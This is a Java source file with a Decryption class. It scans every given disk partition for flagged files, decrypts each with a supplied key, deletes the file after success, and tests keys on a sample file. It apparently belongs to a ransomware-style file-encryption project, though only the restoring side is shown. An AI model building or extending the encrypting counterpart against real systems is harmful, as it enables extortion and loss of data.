package encryptionAndDecryption;

import enums.To;
import files.GetFiles;

import javax.crypto.Cipher;
import java.io.File;
import java.util.ArrayList;

public class Decryption {
    public static void decryption(String key, GetFiles getterFiles, File[] partitions) {
        ArrayList<File> filesP;
        for (File partition : partitions) {
            filesP = getterFiles.scanFiles(partition, To.DECRYPTION, false);
            for (File file : filesP) {
                if (EncryptionAndDecryption.encryptionAndDecryption(Cipher.DECRYPT_MODE, key, file))
                    file.delete();
            }
        }
    }

    public static boolean check(String key, File sampleFile) {
        return EncryptionAndDecryption.encryptionAndDecryption(Cipher.DECRYPT_MODE, key, sampleFile);
    }
}
